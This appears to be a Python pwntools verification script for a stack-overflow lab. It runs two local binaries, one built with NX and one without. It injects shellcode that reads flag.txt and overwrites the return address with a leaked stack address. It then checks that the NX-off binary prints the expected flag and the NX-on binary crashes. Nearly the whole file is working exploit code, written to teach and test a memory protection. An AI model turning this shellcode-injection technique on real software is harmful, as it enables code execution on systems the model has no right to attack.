#!/usr/bin/env python3
from pathlib import Path
from signal import SIGSEGV

from pwn import asm, context, p64, process, shellcraft

HERE = Path(__file__).resolve().parent
NX_OFF = HERE / "stack_shellcode_nx_off"
NX_ON = HERE / "stack_shellcode_nx_on"
EXPECTED = b"KSJ{STACK_SHELLCODE_NX_OFF_VERIFIED}"

context.arch = "amd64"
context.log_level = "error"
shellcode = asm(shellcraft.cat("flag.txt") + shellcraft.exit(0))
assert len(shellcode) <= 72


def payload_for(binary: Path):
    tube = process([str(binary)], cwd=str(HERE))
    line = tube.recvline()
    address = int(line.split(b" @ ")[1], 16)
    payload = shellcode + b"A" * (72 - len(shellcode)) + p64(address)
    return tube, payload


off, payload = payload_for(NX_OFF)
off.send(payload)
output = off.recvall(timeout=2)
assert EXPECTED in output, output

on, payload = payload_for(NX_ON)
on.send(payload)
on.recvall(timeout=2)
status = on.poll(block=True)
assert status == -SIGSEGV, status
print("[PASS] NX OFF shellcode 실행 / NX ON SIGSEGV 비교 검증 완료")
